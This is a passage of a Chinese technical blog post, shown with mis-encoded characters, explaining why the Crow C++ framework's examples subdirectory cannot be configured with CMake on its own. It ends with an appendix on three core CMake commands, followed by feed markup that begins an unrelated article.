â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">2</span>. <span class="hljs-built_in">add_warnings_optimizations</span>()                  â”‚   â”‚
â”‚  â”‚    â† éœ€è¦ compiler_options<span class="hljs-selector-class">.cmake</span> ä¸­çš„å‡½æ•°       â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">3</span>. <span class="hljs-built_in">target_link_libraries</span>(..., Crow::Crow)       â”‚   â”‚
â”‚  â”‚    â† éœ€è¦æ ¹ç›®å½•å®šä¹‰çš„ Crow::Crow ç›®æ ‡            â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">4</span>. <span class="hljs-built_in">if</span>(<span class="hljs-string">"compression"</span> IN_LIST CROW_FEATURES)      â”‚   â”‚
â”‚  â”‚    â† éœ€è¦æ ¹ç›®å½•è®¾ç½®çš„ CROW_FEATURES å˜é‡         â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-17">å››ã€ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œ</h3>
<h4 data-id="heading-18">4.1 è·¯å¾„è§£æé—®é¢˜</h4>
<p><strong>åœºæ™¯</strong>ï¼šåœ¨ <code>examples</code> ç›®å½•æ‰§è¡Œ <code>cmake .</code></p>
<pre><code class="hljs language-cmake" lang="cmake">include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)
</code></pre>
<ul>
<li><code>CMAKE_SOURCE_DIR</code> = <code>C:/Users/notfr/projects/Crow/examples</code></li>
<li>è§£æè·¯å¾„ï¼š<code>examples/cmake/compiler_options.cmake</code> âŒ</li>
<li>å®é™…è·¯å¾„ï¼š<code>æ ¹ç›®å½•/cmake/compiler_options.cmake</code> âœ…</li>
</ul>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span> at <span class="hljs-title class_">CMakeLists</span>.<span class="hljs-property">txt</span>:<span class="hljs-number">4</span> (include):
  include could not find load <span class="hljs-attr">file</span>:
    <span class="hljs-attr">C</span>:<span class="hljs-regexp">/Users/</span>notfr/projects/<span class="hljs-title class_">Crow</span>/examples/cmake/compiler_options.<span class="hljs-property">cmake</span>
</code></pre>
<h4 data-id="heading-19">4.2 ç›®æ ‡ä¸å­˜åœ¨é—®é¢˜</h4>
<p><strong>åœºæ™¯</strong>ï¼šå³ä½¿ä¿®å¤äº†è·¯å¾„é—®é¢˜ï¼Œç»§ç»­æ‰§è¡Œ</p>
<pre><code class="hljs language-cmake" lang="cmake">target_link_libraries(basic_example PUBLIC Crow::Crow)
</code></pre>
<ul>
<li><code>Crow::Crow</code> ç›®æ ‡åœ¨æ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> ä¸­å®šä¹‰</li>
<li>ä» <code>examples</code> ç›®å½•æ‰§è¡Œæ—¶ï¼Œæ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> æœªæ‰§è¡Œ</li>
<li>ç›®æ ‡ä¸å­˜åœ¨</li>
</ul>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CMake Error at CMakeLists.txt:<span class="hljs-number">40</span> (target_link_libraries):
  Cannot specify link libraries <span class="hljs-keyword">for</span> target <span class="hljs-string">"basic_example"</span> which <span class="hljs-keyword">is</span> not
  built <span class="hljs-keyword">by</span> <span class="hljs-keyword">this</span> project.
  
  CMake Error: The following variables are used <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> project, but they are
  <span class="hljs-keyword">set</span> to NOTFOUND.
  Please <span class="hljs-keyword">set</span> them or make sure they are <span class="hljs-keyword">set</span> correctly:
  Crow::Crow
</code></pre>
<h4 data-id="heading-20">4.3 ä¾èµ–åº“æœªæŸ¥æ‰¾é—®é¢˜</h4>
<p>å³ä½¿æ‰‹åŠ¨åˆ›å»ºäº† <code>Crow::Crow</code> ç›®æ ‡ï¼Œè¿˜éœ€è¦ï¼š</p>
<ol>
<li>
<p><strong>æŸ¥æ‰¾ asio åº“</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">find_package(asio REQUIRED)
</code></pre>
<ul>
<li>éœ€è¦æ ¹ç›®å½•çš„ <code>cmake/Findasio.cmake</code> æ¨¡å—</li>
<li>éœ€è¦æ­£ç¡®çš„ <code>CMAKE_MODULE_PATH</code> é…ç½®</li>
</ul>
</li>
<li>
<p><strong>è®¾ç½®åŒ…å«ç›®å½•</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow INTERFACE ${CMAKE_CURRENT_SOURCE_DIR}/include)
</code></pre>
<ul>
<li><code>CMAKE_CURRENT_SOURCE_DIR</code> åœ¨ <code>examples</code> ç›®å½•æ‰§è¡Œæ—¶æŒ‡å‘ <code>examples</code></li>
<li>ä½†å¤´æ–‡ä»¶åœ¨æ ¹ç›®å½•çš„ <code>include/</code> ä¸­</li>
</ul>
</li>
</ol>
<h4 data-id="heading-21">4.4 å˜é‡æœªå®šä¹‰é—®é¢˜</h4>
<pre><code class="hljs language-cmake" lang="cmake">if("compression" IN_LIST CROW_FEATURES)
</code></pre>
<ul>
<li><code>CROW_FEATURES</code> åœ¨æ ¹ç›®å½•æ ¹æ® <code>CROW_ENABLE_COMPRESSION</code> å’Œ <code>CROW_ENABLE_SSL</code> è®¾ç½®</li>
<li>ä» <code>examples</code> ç›®å½•æ‰§è¡Œæ—¶ï¼Œè¿™äº›å˜é‡æœªå®šä¹‰</li>
<li>æ¡ä»¶åˆ¤æ–­å¯èƒ½äº§ç”Ÿæ„å¤–è¡Œä¸º</li>
</ul>
<h4 data-id="heading-22">4.5 CMake å­é¡¹ç›®æœºåˆ¶çš„æœ¬è´¨</h4>
<p>CMake çš„ <code>add_subdirectory()</code> æœºåˆ¶è®¾è®¡ä¸Šå°±æ˜¯<strong>å•å‘ä¾èµ–</strong>çš„ï¼š</p>
<ul>
<li><strong>çˆ¶ç›®å½• â†’ å­ç›®å½•</strong>ï¼šçˆ¶ç›®å½•çš„æ‰€æœ‰å®šä¹‰ï¼ˆç›®æ ‡ã€å˜é‡ã€å‡½æ•°ï¼‰å¯¹å­ç›®å½•å¯è§ âœ…</li>
<li><strong>å­ç›®å½• â†’ çˆ¶ç›®å½•</strong>ï¼šå­ç›®å½•ä¸èƒ½ç‹¬ç«‹è¿è¡Œï¼Œå¿…é¡»é€šè¿‡çˆ¶ç›®å½•è°ƒç”¨ âŒ</li>
</ul>
<p>è¿™æ˜¯ CMake çš„è®¾è®¡å“²å­¦ï¼š<strong>å­é¡¹ç›®æ˜¯çˆ¶é¡¹ç›®çš„ç»„æˆéƒ¨åˆ†ï¼Œä¸æ˜¯ç‹¬ç«‹é¡¹ç›®</strong>ã€‚</p>
<h3 data-id="heading-23">äº”ã€æ­£ç¡®çš„ä½¿ç”¨æ–¹å¼</h3>
<h4 data-id="heading-24">5.1 æ ‡å‡†æ„å»ºæµç¨‹</h4>
<pre><code class="hljs language-powershell" lang="powershell"># 1. åœ¨æ ¹ç›®å½•é…ç½® CMake
cd C:\Users\notfr\projects\Crow
cmake -B build -S .

# 2. åœ¨æ ¹ç›®å½•æ„å»ºæ‰€æœ‰ç›®æ ‡
cmake --build build

# 3. åœ¨æ ¹ç›®å½•åªæ„å»º basic_example
cmake --build build --target basic_example
</code></pre>
<h4 data-id="heading-25">5.2 ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡</h4>
<ol>
<li><strong>å•ä¸€é…ç½®æº</strong>ï¼šæ‰€æœ‰ CMake é€‰é¡¹ï¼ˆå¦‚ <code>CROW_ENABLE_SSL</code>ï¼‰åœ¨æ ¹ç›®å½•ç»Ÿä¸€é…ç½®</li>
<li><strong>ä¾èµ–ç®¡ç†é›†ä¸­</strong>ï¼šæ‰€æœ‰ä¾èµ–åº“ï¼ˆasioã€OpenSSL ç­‰ï¼‰åœ¨æ ¹ç›®å½•ç»Ÿä¸€æŸ¥æ‰¾å’Œé…ç½®</li>
<li><strong>ç›®æ ‡å¯è§æ€§</strong>ï¼š<code>Crow::Crow</code> ç›®æ ‡å¯¹æ‰€æœ‰å­é¡¹ç›®å¯è§</li>
<li><strong>æ„å»ºä¸€è‡´æ€§</strong>ï¼šç¡®ä¿æ‰€æœ‰å­é¡¹ç›®ä½¿ç”¨ç›¸åŒçš„ç¼–è¯‘é€‰é¡¹å’Œé…ç½®</li>
</ol>
<h4 data-id="heading-26">5.3 å¦‚æœç¡®å®éœ€è¦ç‹¬ç«‹æ„å»º</h4>
<p>å¦‚æœç¡®å®éœ€è¦ä» <code>examples</code> ç›®å½•ç‹¬ç«‹æ„å»ºï¼ˆä¸æ¨èï¼‰ï¼Œéœ€è¦ï¼š</p>
<ol>
<li>
<p><strong>ä¿®æ”¹è·¯å¾„å¼•ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½¿ç”¨ç›¸å¯¹è·¯å¾„æˆ–ç»å¯¹è·¯å¾„
include(../cmake/compiler_options.cmake)
</code></pre>
</li>
<li>
<p><strong>æ‰‹åŠ¨å®šä¹‰ Crow::Crow ç›®æ ‡</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æŸ¥æ‰¾ä¾èµ–
list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/../cmake)
find_package(asio REQUIRED)

# åˆ›å»ºç›®æ ‡
add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)
target_include_directories(Crow INTERFACE ${CMAKE_CURRENT_SOURCE_DIR}/../include)
target_link_libraries(Crow INTERFACE asio::asio)
</code></pre>
</li>
<li>
<p><strong>è®¾ç½®å¿…è¦çš„å˜é‡</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">if(NOT DEFINED CROW_FEATURES)
    set(CROW_FEATURES "")
endif()
</code></pre>
</li>
</ol>
<p>ä½†è¿™æ ·åšä¼šï¼š</p>
<ul>
<li>ç ´åé¡¹ç›®çš„ç»Ÿä¸€æ€§</li>
<li>å¢åŠ ç»´æŠ¤æˆæœ¬</li>
<li>å¯èƒ½å¯¼è‡´é…ç½®ä¸ä¸€è‡´</li>
</ul>
<h3 data-id="heading-27">å…­ã€æ€»ç»“</h3>
<h4 data-id="heading-28">6.1 æ ¸å¿ƒè¦ç‚¹</h4>
<ol>
<li>
<p><strong>æ ¹ç›®å½• CMakeLists.txt</strong> æ˜¯æ„å»ºç³»ç»Ÿçš„æ ¸å¿ƒï¼š</p>
<ul>
<li>å®šä¹‰é¡¹ç›®åŸºç¡€è®¾æ–½</li>
<li>æŸ¥æ‰¾å’Œé…ç½®æ‰€æœ‰ä¾èµ–åº“</li>
<li>åˆ›å»º <code>Crow::Crow</code> INTERFACE åº“ç›®æ ‡</li>
<li>è®¾ç½®å…¨å±€å˜é‡å’Œé€‰é¡¹</li>
</ul>
</li>
<li>
<p><strong>examples/CMakeLists.txt</strong> æ˜¯å­é¡¹ç›®ï¼š</p>
<ul>
<li>ä¾èµ–çˆ¶ç›®å½•çš„æ‰€æœ‰å®šä¹‰</li>
<li>ä½¿ç”¨çˆ¶ç›®å½•çš„ç›®æ ‡ã€å˜é‡å’Œå‡½æ•°</li>
<li>ä¸èƒ½ç‹¬ç«‹è¿è¡Œ</li>
</ul>
</li>
<li>
<p><strong>ä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„åŸå› </strong>ï¼š</p>
<ul>
<li>è·¯å¾„è§£æé”™è¯¯ï¼ˆ<code>CMAKE_SOURCE_DIR</code> æŒ‡å‘é”™è¯¯ï¼‰</li>
<li>ç›®æ ‡ä¸å­˜åœ¨ï¼ˆ<code>Crow::Crow</code> æœªå®šä¹‰ï¼‰</li>
<li>ä¾èµ–åº“æœªæŸ¥æ‰¾ï¼ˆasio ç­‰ï¼‰</li>
<li>å˜é‡æœªå®šä¹‰ï¼ˆ<code>CROW_FEATURES</code> ç­‰ï¼‰</li>
<li>è¿å CMake å­é¡¹ç›®è®¾è®¡åŸåˆ™</li>
</ul>
</li>
</ol>
<h4 data-id="heading-29">6.2 æœ€ä½³å®è·µ</h4>
<ul>
<li>âœ… <strong>å§‹ç»ˆä»æ ¹ç›®å½•æ‰§è¡Œ CMake</strong></li>
<li>âœ… <strong>ä½¿ç”¨ <code>--target</code> é€‰é¡¹åªæ„å»ºéœ€è¦çš„ç›®æ ‡</strong></li>
<li>âœ… <strong>ä¿æŒå­é¡¹ç›®å¯¹çˆ¶ç›®å½•çš„ä¾èµ–å…³ç³»</strong></li>
<li>âŒ <strong>ä¸è¦å°è¯•ä»å­ç›®å½•ç‹¬ç«‹æ„å»º</strong></li>
</ul>
<h4 data-id="heading-30">6.3 è®¾è®¡å“²å­¦</h4>
<p>Crow é¡¹ç›®çš„ CMake ç»“æ„ä½“ç°äº†ç°ä»£ CMake çš„æœ€ä½³å®è·µï¼š</p>
<ul>
<li><strong>æ¥å£åº“ï¼ˆINTERFACE Libraryï¼‰</strong>ï¼šé€‚åˆ header-only åº“</li>
<li><strong>ç›®æ ‡å¯¼å‘</strong>ï¼šä½¿ç”¨ <code>target_*</code> å‘½ä»¤è€Œéå…¨å±€å˜é‡</li>
<li><strong>å­é¡¹ç›®ç»„ç»‡</strong>ï¼šé€šè¿‡ <code>add_subdirectory()</code> ç®¡ç†å¤æ‚é¡¹ç›®</li>
<li><strong>ä¾èµ–ä¼ æ’­</strong>ï¼šé€šè¿‡ INTERFACE å±æ€§è‡ªåŠ¨ä¼ æ’­ä¾èµ–</li>
</ul>
<p>è¿™ç§è®¾è®¡ç¡®ä¿äº†æ„å»ºç³»ç»Ÿçš„ä¸€è‡´æ€§ã€å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<h2 data-id="heading-31">é™„1 Cmakeä¸‰ä¸ªæœ€é‡è¦çš„è¯­æ³•</h2>
<p>æˆ‘ä»¬ç”¨â€œå‰ƒåˆ€åŸåˆ™â€ï¼ˆå³å¥¥å¡å§†å‰ƒåˆ€ï¼šå¦‚æ— å¿…è¦ï¼Œå‹¿å¢å®ä½“ï¼‰æ¥æ€è€ƒ CMake â€”â€” åªä¿ç•™æœ€æ ¸å¿ƒã€æœ€å¿…è¦ã€èƒ½æ”¯æ’‘ç»å¤§å¤šæ•°é¡¹ç›®çš„ä¸‰ä¸ªè¯­æ³•è¦ç´ ã€‚å»æ‰èŠ±é‡Œèƒ¡å“¨çš„ç»†èŠ‚ï¼Œåªè®²çœŸæ­£â€œä¸å¯æˆ–ç¼ºâ€çš„ä¸‰ä»¶å¥—ã€‚</p>
<hr/>
<h4 data-id="heading-32">âœ‚ï¸ å‰ƒåˆ€åŸåˆ™ä¸‹çš„ CMake æœ€é‡è¦ä¸‰ä¸ªè¯­æ³•ï¼š</h4>
<h5 data-id="heading-33">1. <strong>project() â€”â€” å®šä¹‰ä½ çš„é¡¹ç›®åå­—å’Œè¯­è¨€</strong></h5>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆå¿…è¦ï¼Ÿ</strong> æ²¡æœ‰é¡¹ç›®ï¼ŒCMake å°±ä¸çŸ¥é“ä½ åœ¨æ„å»ºä»€ä¹ˆã€‚</p>
<p><strong>é€šä¿—ç†è§£</strong>ï¼šå°±åƒä½ å†™ä½œæ–‡è¦å…ˆèµ·ä¸ªæ ‡é¢˜ï¼Œ<code>project()</code> å°±æ˜¯ç»™ä½ çš„ä»£ç å·¥ç¨‹èµ·ä¸ªâ€œåå­—â€ã€‚</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># æœ€ç®€å½¢å¼
project(MyApp)

# æ›´å¸¸è§ï¼šæŒ‡å®šè¯­è¨€ï¼ˆC++ æ˜¯é»˜è®¤ï¼Œä½†æ˜¾å¼å†™å‡ºæ›´æ¸…æ™°ï¼‰
project(MyApp LANGUAGES CXX)
</code></pre>
<p>âœ… <strong>å‰ƒåˆ€ç†ç”±</strong>ï¼šæ²¡æœ‰ <code>project()</code>ï¼Œåç»­å¾ˆå¤šå˜é‡ï¼ˆæ¯”å¦‚ <code>${PROJECT_NAME}</code>ï¼‰éƒ½æ— æ³•ä½¿ç”¨ï¼Œæ„å»ºç³»ç»Ÿä¹Ÿæ— æ³•æ­£ç¡®åˆå§‹åŒ–ã€‚</p>
<hr/>
<h5 data-id="heading-34">2. <strong>add_executable() æˆ– add_library() â€”â€” å‘Šè¯‰ CMake è¦ç”Ÿæˆä»€ä¹ˆ</strong></h5>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆå¿…è¦ï¼Ÿ</strong> ä½ æ€»å¾—å‘Šè¯‰ CMakeï¼šâ€œæˆ‘è¦ç¼–è¯‘å‡ºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºâ€è¿˜æ˜¯â€œæˆ‘è¦æ‰“åŒ…æˆä¸€ä¸ªåº“â€ã€‚</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># ç¼–è¯‘ä¸€ä¸ªå« my_app çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæºç æ˜¯ main.cpp
add_executable(my_app main.cpp utils.cpp)

# æˆ–è€…ç¼–è¯‘ä¸€ä¸ªé™æ€åº“
add_library(my_utils STATIC utils.cpp helper.cpp)
</code></pre>
<p>âœ… <strong>å‰ƒåˆ€ç†ç”±</strong>ï¼šè¿™æ˜¯ CMake çš„â€œç›®æ ‡â€ï¼ˆtargetï¼‰æœºåˆ¶çš„æ ¸å¿ƒã€‚ä¸å®šä¹‰ç›®æ ‡ï¼Œå°±æ²¡æœ‰ä»»ä½•ä¸œè¥¿ä¼šè¢«ç¼–è¯‘ï¼</p>
<hr/>
<h5 data-id="heading-35">3. <strong>target_link_libraries() â€”â€” å‘Šè¯‰ CMake ç›®æ ‡ä¾èµ–ä»€ä¹ˆ</strong></h5>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆå¿…è¦ï¼Ÿ</strong> ç¨‹åºå¾ˆå°‘å­¤ç«‹å­˜åœ¨ï¼Œé€šå¸¸è¦é“¾æ¥æ ‡å‡†åº“ã€ç¬¬ä¸‰æ–¹åº“ï¼Œæˆ–è€…è‡ªå·±å†™çš„å…¶ä»–æ¨¡å—ã€‚</p>
</blockquote>
<pre><code class="hljs language-cmake" lang="cmake"># my_app ä¾èµ– my_utils è¿™ä¸ªåº“
target_link_libraries(my_app PRIVATE my_utils)

# æˆ–è€…é“¾æ¥ç³»ç»Ÿçº¿ç¨‹åº“
target_link_libraries(my_app PRIVATE Threads::Threads)
</code></pre>
<p>âœ… <strong>å‰ƒåˆ€ç†ç”±</strong>ï¼šç°ä»£ CMake å¼ºè°ƒâ€œåŸºäºç›®æ ‡çš„ä¾èµ–ç®¡ç†â€ã€‚ç”¨ <code>target_link_libraries()</code> ä¸ä»…èƒ½é“¾æ¥åº“ï¼Œè¿˜èƒ½è‡ªåŠ¨ä¼ é€’å¤´æ–‡ä»¶è·¯å¾„ã€ç¼–è¯‘é€‰é¡¹ç­‰â€”â€”å®ƒæ˜¯ç»„ç»‡ä¾èµ–çš„å”¯ä¸€ç®€æ´ä¸”æ­£ç¡®çš„æ–¹å¼ã€‚</p>
<hr/>
<h4 data-id="heading-36">ğŸ¯ ä¸¾ä¸ªå®Œæ•´å°ä¾‹å­ï¼ˆä¸‰è¡Œæå®šä¸€ä¸ª C++ é¡¹ç›®ï¼‰ï¼š</h4>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
project(MyApp LANGUAGES CXX)
add_executable(hello main.cpp)
target_link_libraries(hello)  # æš‚æ— ä¾èµ–ï¼Œå¯çœç•¥ï¼Œä½†ä¹ æƒ¯ä¿ç•™ç»“æ„
</code></pre>
<p>å³ä½¿åªæœ‰è¿™ä¸‰è¡Œï¼Œä¹Ÿèƒ½åœ¨ä»»ä½•å¹³å°ç”Ÿæˆ Makefileã€Visual Studio å·¥ç¨‹æˆ– Xcode é¡¹ç›®ï¼</p>
<hr/>
<h4 data-id="heading-37">âœ… æ€»ç»“ï¼ˆå‰ƒåˆ€ä¸‰è¦ç´ ï¼‰ï¼š</h4>

























<table><thead><tr><th>è¯­æ³•</th><th>ä½œç”¨</th><th>ç±»æ¯”</th></tr></thead><tbody><tr><td><code>project()</code></td><td>èµ·åå­—ã€å®šè¯­è¨€</td><td>ç»™é¡¹ç›®åŠâ€œèº«ä»½è¯â€</td></tr><tr><td><code>add_executable()</code> / <code>add_library()</code></td><td>å®šä¹‰è¦æ„å»ºä»€ä¹ˆ</td><td>å†™â€œä»»åŠ¡æ¸…å•â€</td></tr><tr><td><code>target_link_libraries()</code></td><td>å£°æ˜ä¾èµ–å…³ç³»</td><td>ç”»â€œå…³ç³»å›¾â€</td></tr></tbody></table>
<p>åªè¦æŒæ¡è¿™ä¸‰ç‚¹ï¼Œ80% çš„ CMake é¡¹ç›®éƒ½èƒ½çœ‹æ‡‚ã€èƒ½å†™ã€‚å…¶ä½™éƒ½æ˜¯é”¦ä¸Šæ·»èŠ±ï¼Œéâ€œå¿…è¦â€ã€‚</p>
<blockquote>
<p>ğŸ’¡ è®°ä½ï¼šCMake çš„æ ¸å¿ƒæ€æƒ³ä¸æ˜¯â€œæ€ä¹ˆç¼–è¯‘â€ï¼Œè€Œæ˜¯â€œæè¿°ä½ çš„é¡¹ç›®ç»“æ„â€ã€‚è¶Šç®€å•ï¼Œè¶Šå¼ºå¤§ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æŠ¢å AIé£æ§èµ›é“åˆ¶é«˜ç‚¹ï¼šä¸ºä»€ä¹ˆfengkong.aiæ˜¯ä½ ä¸èƒ½é”™è¿‡çš„æˆ˜ç•¥èµ„äº§ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7596904122866040883</link>    <guid>https://juejin.cn/post/7596904122866040883</guid>    <pubDate>2026-01-19T22:54:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596904122866040883" data-draft-id="7596906923892752394" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æŠ¢å AIé£æ§èµ›é“åˆ¶é«˜ç‚¹ï¼šä¸ºä»€ä¹ˆfengkong.aiæ˜¯ä½ ä¸èƒ½é”™è¿‡çš„æˆ˜ç•¥èµ„äº§ï¼Ÿ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-19T22:54:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ•°æ“AI"/> <meta itemprop="url" content="https://juejin.cn/user/2928754707402423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æŠ¢å AIé£æ§èµ›é“åˆ¶é«˜ç‚¹ï¼šä¸ºä»€ä¹ˆfengkong.aiæ˜¯ä½ ä¸èƒ½é”™è¿‡çš„æˆ˜ç•¥èµ„äº§ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754707402423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ•°æ“AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T22:54:40.000Z" title="Mon Jan 19 2026 22:54:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid 